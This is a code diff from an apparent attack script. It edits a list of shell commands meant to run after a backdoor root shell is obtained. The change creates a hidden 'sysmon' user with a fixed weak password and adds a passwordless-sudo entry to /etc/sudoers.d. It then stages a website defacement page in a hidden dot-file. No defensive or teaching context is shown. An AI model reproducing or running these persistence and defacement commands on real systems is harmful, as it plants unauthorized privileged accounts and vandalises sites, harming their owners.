@@ -40,9 +40,11 @@ DEFACE_HTML = (
 
 # Shell commands run after gaining the backdoor root shell
 PERSISTENCE_COMMANDS = [
-    # 1. Create backdoor user (fails silently if already exists)
+    # 1. Create backdoor user and grant passwordless sudo
     "useradd -m -s /bin/bash sysmon 2>/dev/null; "
-    "echo 'sysmon:sysmon123' | chpasswd",
+    "echo 'sysmon:sysmon123' | chpasswd; "
+    "echo 'sysmon ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysmon; "
+    "chmod 440 /etc/sudoers.d/sysmon",
 
     # 2. Drop the deface page into a hidden dot-file owned by sysmon
     f"echo '{DEFACE_HTML}' > /home/sysmon/.page",
